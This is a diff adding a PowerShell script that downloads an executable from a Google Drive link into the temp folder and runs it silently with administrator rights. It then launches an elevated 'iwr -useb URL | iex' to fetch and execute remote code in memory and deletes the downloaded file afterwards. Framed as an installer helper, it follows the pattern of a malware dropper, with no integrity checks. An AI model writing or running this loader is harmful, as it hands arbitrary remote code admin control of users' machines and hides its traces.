@@ -1,0 +1,70 @@
+# Define the URL of the Google Drive file
+$googleDriveFileUrl = "https://drive.google.com/uc?export=download&id=YOUR_FILE_ID"
+
+# Define the local path to save the downloaded file in the temp folder
+$localFilePath = Join-Path $env:TEMP "installer.exe"
+
+# Function to log messages
+function Log-Message {
+    param (
+        [string]$message
+    )
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Write-Output "$timestamp - $message"
+}
+
+# Function to download the file
+function Download-File {
+    param (
+        [string]$url,
+        [string]$outputPath
+    )
+
+    try {
+        Log-Message "Starting download from $url..."
+        Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction Stop
+        Log-Message "File downloaded successfully to $outputPath."
+    } catch {
+        Log-Message "Error downloading file: $_"
+        throw $_
+    }
+}
+
+# Function to install the downloaded file
+function Install-File {
+    param (
+        [string]$filePath
+    )
+
+    try {
+        Log-Message "Starting installation of $filePath with admin privileges..."
+        Start-Process -FilePath $filePath -ArgumentList "/S" -Wait -NoNewWindow -Verb RunAs -ErrorAction Stop
+        Log-Message "Installation completed successfully."
+    } catch {
+        Log-Message "Error during installation: $_"
+        throw $_
+    }
+}
+
+# Main script execution
+try {
+    # Download the file
+    Download-File -url $googleDriveFileUrl -outputPath $localFilePath
+
+    # Install the file
+    Install-File -filePath $localFilePath
+
+    # Execute additional command after installation with admin privileges
+    Log-Message "Executing additional command with admin privileges..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "iwr -useb $googleDriveFileUrl | iex" -Verb RunAs -Wait -NoNewWindow -ErrorAction Stop
+    Log-Message "Additional command executed successfully."
+} catch {
+    Log-Message "Script failed: $_"
+    exit 1
+} finally {
+    # Clean up downloaded file
+    if (Test-Path $localFilePath) {
+        Remove-Item $localFilePath -ErrorAction SilentlyContinue
+        Log-Message "Cleaned up downloaded file."
+    }
+}
